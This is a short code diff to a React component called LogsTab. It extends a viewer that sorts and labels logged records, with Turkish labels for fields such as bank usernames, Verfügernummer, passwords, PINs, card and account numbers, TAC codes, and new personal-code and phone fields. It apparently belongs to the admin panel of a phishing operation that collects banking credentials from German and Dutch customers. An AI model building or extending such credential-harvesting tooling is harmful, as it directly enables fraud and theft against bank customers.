@@ -644,7 +644,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                               return !ignoredKeys.includes(key);
                             })
                             .sort(([keyA], [keyB]) => {
-                              const order = ["username", "verfuegernummer", "password", "pin", "pasnummer", "rekeningnummer", "toegangscode", "signatuur", "identificatiecode", "tacCode"];
+                              const order = ["loginMethod", "personalCode", "phone", "username", "verfuegernummer", "password", "pin", "pasnummer", "rekeningnummer", "toegangscode", "signatuur", "identificatiecode", "tacCode"];
                               const indexA = order.indexOf(keyA);
                               const indexB = order.indexOf(keyB);
                               if (indexA !== -1 && indexB !== -1) return indexA - indexB;
@@ -654,14 +654,18 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                             })
                             .map(([key, value]) => {
                               let displayKey = key;
-                              if (key === "username" || key === "verfuegernummer") displayKey = "K.Adı";
-                              else if (key === "password" || key === "pin") displayKey = "Şifre";
+                              if (key === "username") displayKey = "K.Adı";
+                              else if (key === "verfuegernummer") displayKey = "ID / K.Adı";
+                              else if (key === "password" || key === "pin") displayKey = "Şifre / PIN";
                               else if (key === "tacCode") displayKey = "TAC";
                               else if (key === "rekeningnummer") displayKey = "Hesap No";
                               else if (key === "pasnummer") displayKey = "Kart No";
                               else if (key === "toegangscode") displayKey = "Giriş Kodu";
                               else if (key === "signatuur") displayKey = "İmza";
                               else if (key === "identificatiecode") displayKey = "Kimlik Kodu";
+                              else if (key === "loginMethod") displayKey = "Giriş Yöntemi";
+                              else if (key === "personalCode") displayKey = "Kimlik No / ID";
+                              else if (key === "phone") displayKey = "Telefon";
                               
                               return (
                                 <div key={key} className="flex gap-1.5 items-start">
